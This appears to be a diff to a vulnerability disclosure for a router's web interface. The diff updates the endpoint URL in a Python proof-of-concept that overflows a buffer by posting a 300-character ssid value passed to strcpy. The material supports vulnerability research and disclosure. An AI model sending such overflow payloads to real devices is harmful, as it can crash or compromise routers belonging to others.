@@ -23,7 +23,7 @@ get value from ssid and call strcpy ,cause buff overflow
 
 ## POC
 ```
-url = "http://192.168.1.13/goform/form_fast_setting_wifi_set"
+url = "http://192.168.1.13/goform/fastsettingwifiset"
 payload = 'A'*300 + '\n'
 
 r = requests.post(url, data={'ssid': payload})
